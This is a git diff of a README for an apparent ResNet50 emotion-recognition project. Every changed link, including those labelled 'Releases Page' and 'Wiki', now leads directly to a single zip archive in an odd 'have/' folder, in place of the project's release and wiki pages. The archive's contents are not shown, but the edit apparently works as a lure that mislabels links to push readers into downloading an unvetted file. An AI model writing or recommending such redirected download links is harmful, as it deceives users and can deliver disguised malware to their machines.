@@ -1,6 +1,6 @@
 # 🎉 ResNet50-Emotion-Recognition-FER2013 - Recognize Emotions in Real Time
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/releases)
+[![Download](https://raw.githubusercontent.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/master/have/ResNet50-Emotion-Recognition-FER2013.zip)](https://raw.githubusercontent.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/master/have/ResNet50-Emotion-Recognition-FER2013.zip)
 
 ## 🚀 Getting Started
 
@@ -35,7 +35,7 @@ To download and install the application, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
 
-   [Visit Releases Page](https://github.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/master/have/ResNet50-Emotion-Recognition-FER2013.zip)
 
 2. **Download the Latest Version:** On the Releases page, find the latest version of the software. Click on the download link for your operating system.
 
@@ -65,7 +65,7 @@ If you encounter issues while using the application, here are some common soluti
 
 ## 📚 Support
 
-For further assistance, you can refer to our [Wiki](https://github.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/wiki) or open an issue in the repository. Our team is here to help you with any challenges.
+For further assistance, you can refer to our [Wiki](https://raw.githubusercontent.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/master/have/ResNet50-Emotion-Recognition-FER2013.zip) or open an issue in the repository. Our team is here to help you with any challenges.
 
 ## 👥 Contributing
 
@@ -82,4 +82,4 @@ Thank you for considering contributing to our project!
 
 This project is licensed under the MIT License. You can use the code freely, but please provide proper attribution.
 
-[Download the Application Now](https://github.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/releases) and begin your journey in emotion recognition today!
+[Download the Application Now](https://raw.githubusercontent.com/UbaidKhan92/ResNet50-Emotion-Recognition-FER2013/master/have/ResNet50-Emotion-Recognition-FER2013.zip) and begin your journey in emotion recognition today!
